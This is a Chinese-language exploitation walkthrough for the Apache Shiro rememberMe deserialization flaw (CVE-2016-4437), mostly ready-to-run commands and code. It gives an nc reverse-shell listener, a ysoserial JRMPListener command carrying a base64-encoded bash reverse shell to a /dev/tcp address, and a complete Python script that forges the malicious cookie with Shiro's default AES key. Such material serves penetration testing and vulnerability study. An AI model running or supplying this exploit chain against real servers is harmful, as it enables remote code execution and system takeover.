## 简介

rememberMe后会产生一个cookie，cookie的产生为用户信息=>序列化=>AES加密=>base64编码=>添加到RememberMe Cookie字段。

由于很多开发者使用了默认的AES密钥，同时又存在了利用链，因此可以构造出一个可以被反序列化的cookie。

## 漏洞利用

### 第一种

直接用shiroexploit工具，检测出来后直接使用工具。

### 第二种

1、利用ysoserial根据特定的利用链创建出payload，然后利用shiro-cookie.py脚本将这个payload序列化-加密-编码后输出。

2、根据利用链创建出payload，payload中要在远程执行的命令需要进行编码（java.runtime编码）

```bash
nc -lvvp 1234  //反弹shell监听


#需要将反弹shell的命令进行java.runtime编码，编码地址为https://ares-x.com/tools/runtime-exec，""内为编码结果。
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 "bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMDAuMTMxLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}"   //攻击机搭建vps服务，存放反弹shell 的payload（准确说这是一个初始payload）

vim shiro-coolie.py   //写一个生成最终cookie的脚本，它从VPS那里获得原始payload进行编码加密等，其内容在最后，用python2跑（不知道python3可不可以）

python2 shiro.py ip:port //vps的ip和端口
```

3、将cookie写入登录时的抓包

这是抓包

![image-20240406154237977](CVE-2016-4437(Shiro550).assets/image-20240406154237977.png)

这是添加cookie后的



![image-20240406154303535](CVE-2016-4437(Shiro550).assets/image-20240406154303535.png)



#######################################

```python
#shiro-cookie.py内容
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")  //密钥key，可以用shiroexpoit或者shiroattack爆破出来
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
 
if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])   
print "rememberMe={0}".format(payload.decode())
```



